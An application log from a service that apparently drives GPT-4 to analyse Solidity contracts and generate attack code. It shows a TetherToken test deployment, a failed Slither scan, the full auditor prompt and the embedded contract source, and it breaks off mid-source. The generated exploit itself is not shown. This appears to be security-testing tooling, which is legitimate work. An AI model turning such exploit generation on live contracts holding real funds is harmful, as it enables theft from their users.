2025-07-05 13:06:00,272 - flask_cors.extension - DEBUG - Request to ''/analysis/status/3'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:06:00,275 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:06:00,277 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:06:00,278 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:06:00,280 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:06:00,282 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:06:00] "[33mGET /analysis/status/3 HTTP/1.1[0m" 404 -
2025-07-05 13:06:00,905 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:06:02,599 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:06:02,799 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-07-05 13:06:02,801 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-07-05 13:06:02,993 - app.services.contract_service - INFO - Contract TetherToken funded
2025-07-05 13:06:02,995 - app.services.contract_service - INFO - Building contract observation...
2025-07-05 13:06:06,326 - app.services.contract_service - INFO - Contract observation built successfully
2025-07-05 13:06:06,330 - app.services.contract_service - INFO - Generating attack strategy...
2025-07-05 13:06:06,332 - app.services.contract_service - INFO - Running Slither analysis...
2025-07-05 13:06:06,357 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 13:06:06,370 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 13:06:06,373 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 13:06:06,375 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-07-05 13:06:06,376 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-05 13:06:06,377 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 13:06:06,392 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:06:06,410 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:06:06,417 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:06:32,190 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:06:32,229 - app.modules.attack_generator - INFO - Received response from OpenAI API in 25.82 seconds
2025-07-05 13:06:32,235 - app.modules.attack_generator - INFO - Contract analysis completed in 25.82 seconds
2025-07-05 13:06:32,238 - app.modules.attack_generator - INFO - Vulnerability assessment: **A. Centralization / Owner Privileges:**

- The owner has extensive control:
  - Can pause/unpause ...
2025-07-05 13:06:32,240 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 13:06:32,243 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:06:32,245 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:06:32,247 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:06:37,649 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:06:37,676 - app.modules.attack_generator - INFO - Received response from OpenAI API in 5.43 seconds
2025-07-05 13:06:37,681 - app.modules.attack_generator - INFO - Attack code generation completed in 5.43 seconds
2025-07-05 13:06:37,683 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 1202
2025-07-05 13:06:37,686 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 31.25 seconds
2025-07-05 13:06:37,688 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 13:06:37,699 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp5_sqpw4u.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x59d3631c86BbE35EF041872d502F218A39FBa150",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x59d3631c86BbE35EF041872d502F218A39FBa150": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99842250980000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0x0290FB167208Af455bB137780163b7B7a9a10C16",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x0290FB167208Af455bB137780163b7B7a9a10C16": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99842250980000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = 